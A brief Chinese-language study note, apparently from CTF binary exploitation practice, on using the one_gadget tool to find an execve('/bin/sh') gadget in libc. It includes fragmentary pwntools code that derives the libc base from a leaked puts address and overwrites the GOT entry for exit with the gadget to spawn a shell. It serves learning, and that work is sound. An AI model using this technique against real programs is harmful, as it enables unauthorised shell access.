我们的 `one_gadget` 的作用是找到我们的 `libc` 中自带的 `execev('/bin/sh',x,x)`

只要我们能在我们的 libc 找到对应的文件，并且我们能够满足我们的限制要求，我们就能够执行我们的对应的函数。
![[Pasted image 20240123182908.png]]

这个时候，我们就可以构造我们的下面的一个 payload
```python
libc_base=int(p.recv(14),16)-libc.sym['puts']
one_gadget=libc_base+0xebcf8
```

然后，我们通过修改我们的 got 表来实现我们的功能
```python
payload=string(elf.got['exit'])
payload2=one_gadget
```